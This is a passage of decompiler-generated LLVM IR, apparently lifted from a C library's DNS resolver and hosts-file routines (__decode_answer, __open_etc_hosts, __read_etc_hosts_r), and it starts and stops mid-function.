  uselistorder label %dec_label_pc_80542ad, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_80542bf = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_80542c4 = icmp slt i32 %v2_80542bf, 0
  %v1_80542c6 = add i32 %v2_80542bf, 4
  %v1_80542c9 = icmp eq i1 %v2_80542c4, false
  %v4_80542c9 = select i1 %v1_80542c9, i32 %v1_80542c6, i32 %v2_80542bf
  ret i32 %v4_80542c9

; uselistorder directives
  uselistorder i32 %v2_80542bf, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80542d0 = load i32, i32* @ebp, align 4
  %v0_80542d1 = load i32, i32* @edi, align 4
  %v0_80542d2 = load i32, i32* @esi, align 4
  %v0_80542d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80542d3, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80542f4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80542f4, i32* %eax.global-to-local, align 4
  %v4_8054301 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80542f4, i32 256)
  store i32 %v4_8054301, i32* %eax.global-to-local, align 4
  %v3_8054309 = icmp slt i32 %v4_8054301, 0
  store i32 %v4_8054301, i32* @edi, align 4
  br i1 %v3_8054309, label %dec_label_pc_80543bc, label %dec_label_pc_8054313

dec_label_pc_8054313:                             ; preds = %entry
  %v0_8054313 = load i32, i32* @ebx, align 4
  %v3_8054313 = add i32 %v0_8054313, %v4_8054301
  %v0_8054315 = load i32, i32* @esi, align 4
  %v2_8054315 = sub i32 %v0_8054315, %v3_8054313
  %v1_8054317 = add i32 %v2_8054315, -10
  %v10_8054317 = icmp slt i32 %v1_8054317, 0
  store i32 %v1_8054317, i32* @esi, align 4
  %v1_8054322 = icmp eq i1 %v10_8054317, false
  br i1 %v1_8054322, label %dec_label_pc_805432b, label %dec_label_pc_8054324

dec_label_pc_8054324:                             ; preds = %dec_label_pc_8054313
  br label %dec_label_pc_80543bc

dec_label_pc_805432b:                             ; preds = %dec_label_pc_8054313
  %v6_8054332 = add i32 %v3_8054313, %tmp4
  store i32 %v6_8054332, i32* @ebx, align 4
  store i32 %v2_80542f4, i32* %eax.global-to-local, align 4
  %v1_805433e = bitcast i32* %stack_var_-272 to i8*
  %v2_805433e = call i32 @__GI_strdup(i8* %v1_805433e)
  store i32 %v2_805433e, i32* %eax.global-to-local, align 4
  %v0_8054343 = load i32, i32* @ebx, align 4
  %v1_8054343 = add i32 %v0_8054343, 4
  store i32 %v1_8054343, i32* %esi.global-to-local, align 4
  %v1_8054346 = load i32, i32* @ebp, align 4
  %v2_8054346 = inttoptr i32 %v1_8054346 to i32*
  store i32 %v2_805433e, i32* %v2_8054346, align 4
  %v0_8054349 = load i32, i32* @ebx, align 4
  %v1_8054349 = inttoptr i32 %v0_8054349 to i8*
  %v2_8054349 = load i8, i8* %v1_8054349, align 1
  %v3_8054349 = zext i8 %v2_8054349 to i32
  store i32 %v3_8054349, i32* %eax.global-to-local, align 4
  %v1_805434c = add i32 %v0_8054349, 1
  %v2_805434c = inttoptr i32 %v1_805434c to i8*
  %v3_805434c = load i8, i8* %v2_805434c, align 1
  %v4_805434c = zext i8 %v3_805434c to i32
  store i32 %v4_805434c, i32* %edx.global-to-local, align 4
  %v2_8054350 = mul nuw nsw i32 %v3_8054349, 256
  %v2_8054353 = or i32 %v4_805434c, %v2_8054350
  store i32 %v2_8054353, i32* %eax.global-to-local, align 4
  %v1_8054355 = load i32, i32* @ebp, align 4
  %v2_8054355 = add i32 %v1_8054355, 4
  %v3_8054355 = inttoptr i32 %v2_8054355 to i32*
  store i32 %v2_8054353, i32* %v3_8054355, align 4
  %v0_8054358 = load i32, i32* @ebx, align 4
  %v1_8054358 = add i32 %v0_8054358, 2
  %v2_8054358 = inttoptr i32 %v1_8054358 to i8*
  %v3_8054358 = load i8, i8* %v2_8054358, align 1
  %v4_8054358 = zext i8 %v3_8054358 to i32
  store i32 %v4_8054358, i32* %eax.global-to-local, align 4
  %v1_805435c = add i32 %v0_8054358, 3
  %v2_805435c = inttoptr i32 %v1_805435c to i8*
  %v3_805435c = load i8, i8* %v2_805435c, align 1
  %v4_805435c = zext i8 %v3_805435c to i32
  store i32 %v4_805435c, i32* %edx.global-to-local, align 4
  %v2_8054360 = mul nuw nsw i32 %v4_8054358, 256
  %v2_8054363 = or i32 %v4_805435c, %v2_8054360
  store i32 %v2_8054363, i32* %eax.global-to-local, align 4
  %v1_8054365 = load i32, i32* @ebp, align 4
  %v2_8054365 = add i32 %v1_8054365, 8
  %v3_8054365 = inttoptr i32 %v2_8054365 to i32*
  store i32 %v2_8054363, i32* %v3_8054365, align 4
  %v0_8054368 = load i32, i32* @ebx, align 4
  %v1_8054368 = add i32 %v0_8054368, 4
  %v2_8054368 = inttoptr i32 %v1_8054368 to i8*
  %v3_8054368 = load i8, i8* %v2_8054368, align 1
  %v4_8054368 = zext i8 %v3_8054368 to i32
  store i32 %v4_8054368, i32* %edx.global-to-local, align 4
  %v0_805436c = load i32, i32* %esi.global-to-local, align 4
  %v1_805436c = add i32 %v0_805436c, 1
  %v2_805436c = inttoptr i32 %v1_805436c to i8*
  %v3_805436c = load i8, i8* %v2_805436c, align 1
  %v4_805436c = zext i8 %v3_805436c to i32
  store i32 %v4_805436c, i32* %eax.global-to-local, align 4
  %v1_8054370 = add i32 %v0_805436c, 2
  %v2_8054370 = inttoptr i32 %v1_8054370 to i8*
  %v3_8054370 = load i8, i8* %v2_8054370, align 1
  %v4_8054370 = zext i8 %v3_8054370 to i32
  %v2_8054374 = mul nuw i32 %v4_8054368, 16777216
  %v2_8054377 = mul nuw nsw i32 %v4_805436c, 65536
  store i32 %v2_8054377, i32* %eax.global-to-local, align 4
  %v2_805437a = or i32 %v2_8054377, %v2_8054374
  store i32 %v2_805437a, i32* %edx.global-to-local, align 4
  %v1_805437c = add i32 %v0_805436c, 3
  %v2_805437c = inttoptr i32 %v1_805437c to i8*
  %v3_805437c = load i8, i8* %v2_805437c, align 1
  %v4_805437c = zext i8 %v3_805437c to i32
  store i32 %v4_805437c, i32* %eax.global-to-local, align 4
  %v2_8054380 = mul nuw nsw i32 %v4_8054370, 256
  %v2_8054383 = or i32 %v4_805437c, %v2_805437a
  store i32 %v2_8054383, i32* %edx.global-to-local, align 4
  %v2_8054385 = or i32 %v2_8054383, %v2_8054380
  store i32 %v2_8054385, i32* @ecx, align 4
  %v1_8054387 = load i32, i32* @ebp, align 4
  %v2_8054387 = add i32 %v1_8054387, 12
  %v3_8054387 = inttoptr i32 %v2_8054387 to i32*
  store i32 %v2_8054385, i32* %v3_8054387, align 4
  %v0_805438a = load i32, i32* @ebx, align 4
  %v1_805438a = add i32 %v0_805438a, 8
  %v2_805438a = inttoptr i32 %v1_805438a to i8*
  %v3_805438a = load i8, i8* %v2_805438a, align 1
  %v4_805438a = zext i8 %v3_805438a to i32
  store i32 %v4_805438a, i32* %edx.global-to-local, align 4
  %v1_805438e = add i32 %v0_805438a, 9
  %v2_805438e = inttoptr i32 %v1_805438e to i8*
  %v3_805438e = load i8, i8* %v2_805438e, align 1
  %v4_805438e = zext i8 %v3_805438e to i32
  store i32 %v4_805438e, i32* %eax.global-to-local, align 4
  %v1_8054392 = add i32 %v0_805438a, 10
  %v1_8054395 = load i32, i32* @ebp, align 4
  %v2_8054395 = add i32 %v1_8054395, 20
  %v3_8054395 = inttoptr i32 %v2_8054395 to i32*
  store i32 %v1_8054392, i32* %v3_8054395, align 4
  %v0_8054398 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054398 = mul i32 %v0_8054398, 256
  %v1_805439b = load i32, i32* %eax.global-to-local, align 4
  %v2_805439b = or i32 %v1_805439b, %v2_8054398
  store i32 %v2_805439b, i32* @edx, align 4
  %v1_805439d = load i32, i32* @ebp, align 4
  %v2_805439d = add i32 %v1_805439d, 16
  %v3_805439d = inttoptr i32 %v2_805439d to i32*
  store i32 %v2_805439b, i32* %v3_805439d, align 4
  %v1_80543a7 = add i32 %v3_8054313, 10
  store i32 %v1_80543a7, i32* %eax.global-to-local, align 4
  %v1_80543aa = load i32, i32* @ebp, align 4
  %v2_80543aa = add i32 %v1_80543aa, 24
  %v3_80543aa = inttoptr i32 %v2_80543aa to i32*
  store i32 %v1_80543a7, i32* %v3_80543aa, align 4
  %v4_80543ad = load i32, i32* @edx, align 4
  %v5_80543b1 = icmp slt i32 %v1_8054317, %v4_80543ad
  br i1 %v5_80543b1, label %dec_label_pc_80543b3, label %dec_label_pc_80543b8

dec_label_pc_80543b3:                             ; preds = %dec_label_pc_805432b
  br label %dec_label_pc_80543bc

dec_label_pc_80543b8:                             ; preds = %dec_label_pc_805432b
  %v1_80543b8 = load i32, i32* @edi, align 4
  %v2_80543b8 = add i32 %v4_80543ad, 10
  %v3_80543b8 = add i32 %v2_80543b8, %v1_80543b8
  br label %dec_label_pc_80543bc

dec_label_pc_80543bc:                             ; preds = %entry, %dec_label_pc_80543b3, %dec_label_pc_8054324, %dec_label_pc_80543b8
  %v0_80543c2 = phi i32 [ %v4_8054301, %entry ], [ -1, %dec_label_pc_80543b3 ], [ %v1_8054317, %dec_label_pc_8054324 ], [ %v3_80543b8, %dec_label_pc_80543b8 ]
  store i32 %v0_80543c2, i32* %eax.global-to-local, align 4
  %v2_80543c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80543c4, i32* @ebx, align 4
  store i32 %v0_80542d2, i32* @esi, align 4
  store i32 %v0_80542d1, i32* @edi, align 4
  store i32 %v0_80542d0, i32* @ebp, align 4
  ret i32 %v0_80543c2

; uselistorder directives
  uselistorder i32 %v0_80543c2, { 1, 0 }
  uselistorder i32 %v2_8054377, { 1, 0 }
  uselistorder i32 %v1_8054317, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8054313, { 1, 0, 2 }
  uselistorder i32 %v4_8054301, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_80542f4, { 1, 0, 2 }
  uselistorder i32 24, { 29, 30, 19, 0, 31, 32, 33, 20, 4, 9, 36, 10, 11, 12, 34, 21, 22, 23, 24, 25, 26, 27, 38, 1, 35, 13, 14, 15, 16, 17, 2, 18, 3, 5, 6, 7, 8, 28, 37 }
  uselistorder i32 20, { 31, 32, 33, 34, 1, 20, 38, 4, 39, 35, 36, 2, 21, 22, 0, 6, 7, 30, 8, 9, 10, 23, 24, 25, 26, 27, 5, 28, 29, 41, 37, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 40 }
  uselistorder i32 9, { 17, 18, 19, 20, 5, 21, 11, 12, 4, 10, 0, 6, 13, 14, 15, 16, 7, 8, 9, 2, 1, 22, 23, 3 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 20, 0, 11, 1, 21, 2, 16, 46, 3, 53, 22, 5, 4, 6, 9, 10, 8, 23, 12, 24, 39, 19, 40, 29, 54, 17, 18, 30, 25, 14, 15, 7, 27, 45, 26, 31, 32, 33, 34, 35, 41, 42, 43, 44, 28, 36, 37, 38, 13 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80543bc, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80543d9 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8057a85.248 to i32), i32 ptrtoint (i32* @global_var_8057a50.236 to i32))
  store i32 %v3_80543d9, i32* @eax, align 4
  %v1_80543e1 = icmp eq i32 %v3_80543d9, 0
  %v1_80543e3 = icmp eq i1 %v1_80543e1, false
  br i1 %v1_80543e3, label %dec_label_pc_80543f9, label %dec_label_pc_80543e5

dec_label_pc_80543e5:                             ; preds = %entry
  %v3_80543f1 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8057a90.249 to i32), i32 ptrtoint (i32* @global_var_8057a50.236 to i32))
  br label %dec_label_pc_80543f9

dec_label_pc_80543f9:                             ; preds = %entry, %dec_label_pc_80543e5
  %v0_80543fc = phi i32 [ %v3_80543d9, %entry ], [ %v3_80543f1, %dec_label_pc_80543e5 ]
  ret i32 %v0_80543fc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 5, 4, 0, 1, 6, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8057a50.236 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80543f9, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80543fd = load i32, i32* @ebp, align 4
  %v0_80543fe = load i32, i32* @edi, align 4
  %v0_80543ff = load i32, i32* @esi, align 4
  %v0_8054400 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_805440e = sub i32 0, %arg6
  %v1_8054410 = urem i32 %v1_805440e, 4
  %v2_8054410 = icmp eq i32 %v1_8054410, 0
  store i32 %v1_8054410, i32* %eax.global-to-local, align 4
  br i1 %v2_8054410, label %dec_label_pc_8054421, label %dec_label_pc_8054415

dec_label_pc_8054415:                             ; preds = %entry
  %v2_8054415 = sub i32 %arg7, %v1_8054410
  %v7_8054415 = icmp ugt i32 %v1_8054410, %arg7
  br i1 %v7_8054415, label %dec_label_pc_80546c5, label %dec_label_pc_805441d

dec_label_pc_805441d:                             ; preds = %dec_label_pc_8054415
  %v2_805441d = add i32 %v1_8054410, %arg6
  store i32 %v2_805441d, i32* @ebx, align 4
  store i32 %v2_8054415, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054421

dec_label_pc_8054421:                             ; preds = %entry, %dec_label_pc_805441d
  %v0_805442f = phi i32 [ %arg6, %entry ], [ %v2_805441d, %dec_label_pc_805441d ]
  %v0_8054436 = phi i32 [ %arg7, %entry ], [ %v2_8054415, %dec_label_pc_805441d ]
  %tmp = icmp ult i32 %v0_8054436, 32
  br i1 %tmp, label %dec_label_pc_80546c5, label %dec_label_pc_805442a

dec_label_pc_805442a:                             ; preds = %dec_label_pc_8054421
  %v12_805442a = icmp eq i32 %arg4, 1
  %v1_805442f = add i32 %v0_805442f, 32
  store i32 %v1_805442f, i32* %eax.global-to-local, align 4
  %v1_8054436 = add i32 %v0_8054436, -32
  store i32 %v1_8054436, i32* @ebp, align 4
  br i1 %v12_805442a, label %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge, label %dec_label_pc_805443f

dec_label_pc_805442a.dec_label_pc_8054575_crit_edge: ; preds = %dec_label_pc_805442a
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8054575

dec_label_pc_805443f:                             ; preds = %dec_label_pc_805442a
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8054446 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8054446, align 4
  %tmp144 = icmp ult i32 %v1_8054436, 4
  br i1 %tmp144, label %dec_label_pc_80546c5, label %dec_label_pc_8054452

dec_label_pc_8054452:                             ; preds = %dec_label_pc_805443f
  %v0_8054452 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054452 = add i32 %v0_8054452, -36
  store i32 %v1_8054452, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_8054452, 8
  br i1 %tmp145, label %dec_label_pc_80546c5, label %dec_label_pc_805445e

dec_label_pc_805445e:                             ; preds = %dec_label_pc_8054452
  %v0_805445e = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_805445e, 16
  br i1 %tmp146, label %dec_label_pc_80546c5, label %dec_label_pc_8054467

dec_label_pc_8054467:                             ; preds = %dec_label_pc_805445e
  %v1_8054467 = add i32 %v0_8054452, -48
  store i32 %v1_8054467, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8054467, 8
  br i1 %tmp147, label %dec_label_pc_80546c5, label %dec_label_pc_8054473

dec_label_pc_8054473:                             ; preds = %dec_label_pc_8054467
  %v0_8054473 = load i32, i32* @ebx, align 4
  %v1_8054473 = add i32 %v0_8054473, 48
  %v1_8054476 = add i32 %v0_8054452, -44
  store i32 %v1_8054476, i32* @ebp, align 4
  %v1_805447d = add i32 %v0_8054452, -56
  store i32 %v1_805447d, i32* @eax, align 4
  %v7_8054480 = icmp ult i32 %v1_805447d, %v1_8054476
  %v1_8054482 = add i32 %v0_8054473, 36
  store i32 %v1_8054482, i32* @edi, align 4
  br i1 %v7_8054480, label %dec_label_pc_805448c, label %dec_label_pc_8054487

dec_label_pc_8054487:                             ; preds = %dec_label_pc_8054473
  %v1_8054487 = add i32 %v0_8054473, 44
  store i32 %v1_8054487, i32* @esi, align 4
  br label %dec_label_pc_8054491

dec_label_pc_805448c:                             ; preds = %dec_label_pc_8054473
  %v1_805448c = add i32 %v0_8054473, 56
  store i32 %v1_805448c, i32* @esi, align 4
  store i32 %v1_805447d, i32* @ebp, align 4
  br label %dec_label_pc_8054491

dec_label_pc_8054491:                             ; preds = %dec_label_pc_8054487, %dec_label_pc_805448c
  %v0_8054491 = phi i32 [ %v1_8054476, %dec_label_pc_8054487 ], [ %v1_805447d, %dec_label_pc_805448c ]
  %tmp148 = icmp ult i32 %v0_8054491, 80
  br i1 %tmp148, label %dec_label_pc_80546c5, label %dec_label_pc_805449a

dec_label_pc_805449a:                             ; preds = %dec_label_pc_8054491
  %v0_805449a = call i32 @__open_etc_hosts()
  store i32 %v0_805449a, i32* %eax.global-to-local, align 4
  %v1_805449f = icmp eq i32 %v0_805449a, 0
  br i1 %v1_805449f, label %dec_label_pc_80544c7, label %dec_label_pc_80544a7

dec_label_pc_80544a7:                             ; preds = %dec_label_pc_805449a
  store i32 %v1_805442f, i32* %edx.global-to-local, align 4
  store i32 %v1_8054473, i32* %eax.global-to-local, align 4
  %v0_80544af = load i32, i32* @edi, align 4
  %v0_80544b3 = load i32, i32* @esi, align 4
  %v4_80544b7 = inttoptr i32 %v1_805442f to i8*
  br label %dec_label_pc_8054575

dec_label_pc_80544c7:                             ; preds = %dec_label_pc_805449a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_80544cb = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_80544cb, align 4
  %v1_80544d1 = call i32 @__errno_location(i32 0)
  store i32 %v1_80544d1, i32* %eax.global-to-local, align 4
  %v1_80544d6 = inttoptr i32 %v1_80544d1 to i32*
  %v2_80544d6 = load i32, i32* %v1_80544d6, align 4
  store i32 %v2_80544d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546c5

dec_label_pc_80544e1:                             ; preds = %dec_label_pc_8054648
  %v2_80544e1 = load i8*, i8** %stack_var_-44, align 4
  %v3_80544e1 = ptrtoint i8* %v2_80544e1 to i32
  store i32 %v3_80544e1, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80544e8 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80544e1, i32* %v2_80544e8, align 4
  %v0_80544ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80544ea = add i32 %v0_80544ea, 4
  %v2_80544ea = inttoptr i32 %v1_80544ea to i32*
  store i32 0, i32* %v2_80544ea, align 4
  %v0_80544f1 = load i32, i32* @ebx, align 4
  %v1_80544f1 = add i32 %v0_80544f1, 4
  %v2_80544f1 = inttoptr i32 %v1_80544f1 to i32*
  %v3_80544f1 = load i32, i32* %v2_80544f1, align 4
  store i32 %v3_80544f1, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80544f1, i32* %arg5, align 4
  %v1_80544fa = add i32 %tmp60, 8
  %v2_80544fa = inttoptr i32 %v1_80544fa to i32*
  store i32 2, i32* %v2_80544fa, align 4
  %v0_8054501 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054501 = add i32 %v0_8054501, 12
  %v2_8054501 = inttoptr i32 %v1_8054501 to i32*
  store i32 4, i32* %v2_8054501, align 4
  br label %dec_label_pc_805453a

dec_label_pc_805450e:                             ; preds = %dec_label_pc_805466a
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8054516 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8054516, align 4
  %v0_8054518 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054518 = add i32 %v0_8054518, 4
  %v2_8054518 = inttoptr i32 %v1_8054518 to i32*
  store i32 0, i32* %v2_8054518, align 4
  %v0_805451f = load i32, i32* @ebx, align 4
  %v1_805451f = add i32 %v0_805451f, 4
  %v2_805451f = inttoptr i32 %v1_805451f to i32*
  %v3_805451f = load i32, i32* %v2_805451f, align 4
  store i32 %v3_805451f, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_805451f, i32* %arg5, align 4
  %v1_8054528 = add i32 %tmp60, 8
  %v2_8054528 = inttoptr i32 %v1_8054528 to i32*
  store i32 10, i32* %v2_8054528, align 4
  %v0_805452f = load i32, i32* %edx.global-to-local, align 4
  %v1_805452f = add i32 %v0_805452f, 12
  %v2_805452f = inttoptr i32 %v1_805452f to i32*
  store i32 16, i32* %v2_805452f, align 4
  br label %dec_label_pc_805453a

dec_label_pc_805453a:                             ; preds = %dec_label_pc_80544e1, %dec_label_pc_805450e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80544e1 ], [ %storemerge3, %dec_label_pc_805450e ]
  %v1_805453a = load i32, i32* %edx.global-to-local, align 4
  %v2_805453a = add i32 %v1_805453a, 16
  %v3_805453a = inttoptr i32 %v2_805453a to i32*
  store i32 %storemerge, i32* %v3_805453a, align 4
  %v0_805453d = load i32, i32* @ebx, align 4
  %v1_805453d = add i32 %v0_805453d, 8
  %v1_8054540 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054540 = add i32 %v1_8054540, 4
  %v3_8054540 = inttoptr i32 %v2_8054540 to i32*
  store i32 %v1_805453d, i32* %v3_8054540, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8054547 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054547 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8054547, i32* %v2_8054547, align 4
  br label %dec_label_pc_80546a5

dec_label_pc_8054575:                             ; preds = %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge, %dec_label_pc_80544a7
  %v1_8054579.pre-phi = phi i32* [ %.pre, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v1_8054446, %dec_label_pc_80544a7 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v4_80544b7, %dec_label_pc_80544a7 ]
  %stack_var_-20.0.in = phi i32 [ %v1_805442f, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v0_80544b3, %dec_label_pc_80544a7 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v1_805442f, %dec_label_pc_80544a7 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v0_80544af, %dec_label_pc_80544a7 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v0_805449a, %dec_label_pc_80544a7 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_805442a.dec_label_pc_8054575_crit_edge ], [ %v1_8054473, %dec_label_pc_80544a7 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8054579.pre-phi, align 4
  %v12_8054603 = icmp eq i32 %arg4, 2
  %v2_805462e = inttoptr i32 %arg2 to i8*
  %v12_8054641 = icmp eq i32 %arg3, 2
  %v12_8054663 = icmp eq i32 %arg3, 10
  %v1_805460d = icmp eq i1 %v12_8054603, false
  %v1_8054646 = icmp eq i1 %v12_8054641, false
  %v1_8054668 = icmp eq i1 %v12_8054663, false
  br label %dec_label_pc_805468b.outer

dec_label_pc_805468b.outer:                       ; preds = %dec_label_pc_8054663, %dec_label_pc_805466a, %dec_label_pc_8054648, %dec_label_pc_8054575
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8054575 ], [ 2, %dec_label_pc_8054648 ], [ 2, %dec_label_pc_805466a ], [ 2, %dec_label_pc_8054663 ]
  br label %dec_label_pc_805468b

dec_label_pc_805458c:                             ; preds = %dec_label_pc_805468b
  %v3_8054594 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8054594, i32* @eax, align 4
  %v1_805459c = icmp eq i32 %v3_8054594, 0
  br i1 %v1_805459c, label %dec_label_pc_80545a3, label %dec_label_pc_80545a0

dec_label_pc_80545a0:                             ; preds = %dec_label_pc_805458c
  %v1_80545a0 = inttoptr i32 %v3_8054594 to i8*
  store i8 0, i8* %v1_80545a0, align 1
  br label %dec_label_pc_80545a3

dec_label_pc_80545a3:                             ; preds = %dec_label_pc_805458c, %dec_label_pc_80545a0
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80545e334 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80545e335 = icmp eq i8 %v2_80545e334, 0
  %v1_80545e641 = icmp eq i1 %v3_80545e335, false
  br i1 %v1_80545e641, label %dec_label_pc_80545af.preheader.preheader, label %dec_label_pc_80545e8

dec_label_pc_80545af.preheader.preheader:         ; preds = %dec_label_pc_80545a3
  %v4_80545af98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80545af.preheader

dec_label_pc_80545ab:                             ; preds = %dec_label_pc_80545b5
  store i8 0, i8* %v1_80545af104, align 1
  %v0_80545ae = load i32, i32* @ecx, align 4
  %v1_80545ae = add i32 %v0_80545ae, 1
  store i32 %v1_80545ae, i32* @ecx, align 4
  %v1_80545af = inttoptr i32 %v1_80545ae to i8*
  %v2_80545af = load i8, i8* %v1_80545af, align 1
  %v3_80545af = zext i8 %v2_80545af to i32
  %v4_80545af = load i32, i32* %eax.global-to-local, align 4
  %v5_80545af = and i32 %v4_80545af, -256
  %v6_80545af = or i32 %v5_80545af, %v3_80545af
  store i32 %v6_80545af, i32* @eax, align 4
  %v4_80545b1 = icmp eq i8 %v2_80545af, 0
  br i1 %v4_80545b1, label %dec_label_pc_80545af.dec_label_pc_80545e8.loopexit_crit_edge, label %dec_label_pc_80545b5

dec_label_pc_80545b5:                             ; preds = %dec_label_pc_80545af.preheader, %dec_label_pc_80545ab
  %v2_80545af105 = phi i8 [ %v2_80545af, %dec_label_pc_80545ab ], [ %v2_80545af96, %dec_label_pc_80545af.preheader ]
  %v1_80545af104 = phi i8* [ %v1_80545af, %dec_label_pc_80545ab ], [ %v1_80545af95, %dec_label_pc_80545af.preheader ]
  %v0_80545ab103 = phi i32 [ %v1_80545ae, %dec_label_pc_80545ab ], [ %v0_80545af49, %dec_label_pc_80545af.preheader ]
  %v2_80545b5 = sext i8 %v2_80545af105 to i32
  store i32 %v2_80545b5, i32* @edx, align 4
  %v0_80545b8 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_80545b8, i32* %eax.global-to-local, align 4
  %v2_80545bd = mul nsw i32 %v2_80545b5, 2
  %v3_80545bd = add i32 %v0_80545b8, %v2_80545bd
  %v4_80545bd = inttoptr i32 %v3_80545bd to i8*
  %v5_80545bd = load i8, i8* %v4_80545bd, align 1
  %v6_80545bd = and i8 %v5_80545bd, 32
  %v7_80545bd = icmp eq i8 %v6_80545bd, 0
  %v1_80545c1 = icmp eq i1 %v7_80545bd, false
  br i1 %v1_80545c1, label %dec_label_pc_80545ab, label %dec_label_pc_80545c3

dec_label_pc_80545c3:                             ; preds = %dec_label_pc_80545b5
  %v0_80545c3 = load i32, i32* @edi, align 4
  %v1_80545c3 = add i32 %v0_80545c3, -6
  %v6_80545c3 = sub i32 5, %v0_80545c3
  %v7_80545c3 = and i32 %v6_80545c3, %v0_80545c3
  %v8_80545c3 = icmp slt i32 %v7_80545c3, 0
  %v9_80545c3 = icmp eq i32 %v1_80545c3, 0
  %v10_80545c3 = icmp slt i32 %v1_80545c3, 0
  %v3_80545c6 = icmp eq i1 %v10_80545c3, %v8_80545c3
  %v4_80545c6 = icmp eq i1 %v9_80545c3, false
  %v5_80545c6 = and i1 %v4_80545c6, %v3_80545c6
  br i1 %v5_80545c6, label %dec_label_pc_80545cf.preheader, label %dec_label_pc_80545c8

dec_label_pc_80545c8:                             ; preds = %dec_label_pc_80545c3
  %v1_80545c8 = load i32, i32* @ebx, align 4
